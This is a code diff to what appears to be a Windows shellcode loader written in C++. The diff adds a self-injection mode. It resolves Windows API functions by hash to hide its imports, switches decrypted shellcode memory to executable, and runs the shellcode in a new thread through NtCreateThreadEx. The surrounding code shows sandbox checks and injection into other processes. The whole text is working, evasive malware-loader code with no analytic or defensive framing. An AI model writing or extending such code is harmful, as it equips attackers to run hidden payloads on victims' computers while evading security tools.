@@ -123,8 +123,11 @@ constexpr DWORD HF_InitProcThreadAttrList   = _hA("InitializeProcThreadAttribute
 constexpr DWORD HF_UpdateProcThreadAttr     = _hA("UpdateProcThreadAttribute");
 constexpr DWORD HF_DeleteProcThreadAttrList = _hA("DeleteProcThreadAttributeList");
 #endif
-#ifdef USE_REMOTE_THREAD
+#if defined(USE_REMOTE_THREAD) || defined(USE_SELF_INJECT)
 constexpr DWORD HF_NtCreateThreadEx         = _hA("NtCreateThreadEx");
+#endif
+#ifdef USE_SELF_INJECT
+constexpr DWORD HF_NtWaitForSingleObject    = _hA("NtWaitForSingleObject");
 #endif
 #ifdef USE_SANDBOX_CHECK
 constexpr DWORD HF_GetTickCount64           = _hA("GetTickCount64");
@@ -520,7 +523,35 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     DBG("[6] No decryption (plaintext)");
 #endif
 
-#ifdef USE_REMOTE_THREAD
+#ifdef USE_SELF_INJECT
+    /* Self-injection: execute shellcode in current process */
+    {
+        typedef NTSTATUS (NTAPI *t_NtCTE)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
+        typedef NTSTATUS (NTAPI *t_NtWSO)(HANDLE,BOOLEAN,PLARGE_INTEGER);
+        typedef BOOL (WINAPI *t_CH)(HANDLE);
+        t_NtCTE pNtCTE = (t_NtCTE)resolve(hNtdll, HF_NtCreateThreadEx);
+        t_NtWSO pNtWSO = (t_NtWSO)resolve(hNtdll, HF_NtWaitForSingleObject);
+        t_CH    pCH    = (t_CH)  R(HMOD_KERNEL32, HF_CloseHandle);
+        if (!pNtCTE) {
+            DBG("[FAIL] SelfInject: NtCreateThreadEx not found");
+            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
+            return 1;
+        }
+        /* sc already decrypted and RW in current process - change to RX */
+        PVOID  prot_base = sc;
+        SIZE_T prot_sz   = sc_sz;
+        ULONG  old_prot  = 0;
+        pNtPVM((HANDLE)-1, &prot_base, &prot_sz, PAGE_EXECUTE_READ, &old_prot);
+        DBG("[SI1] Self RW -> RX");
+        HANDLE hThread = NULL;
+        NTSTATUS st = pNtCTE(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, sc, NULL, 0, 0, 0, 0, NULL);
+        DBG_HEX("[SI2] NtCreateThreadEx status", (unsigned long long)(ULONG)st);
+        if (hThread) {
+            if (pNtWSO) pNtWSO(hThread, FALSE, NULL);
+            if (pCH)    pCH(hThread);
+        }
+    }
+#elif defined(USE_REMOTE_THREAD)
     /* Inject into existing process via NtCreateThreadEx */
     {
         typedef NTSTATUS (NTAPI *t_NtCTE)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
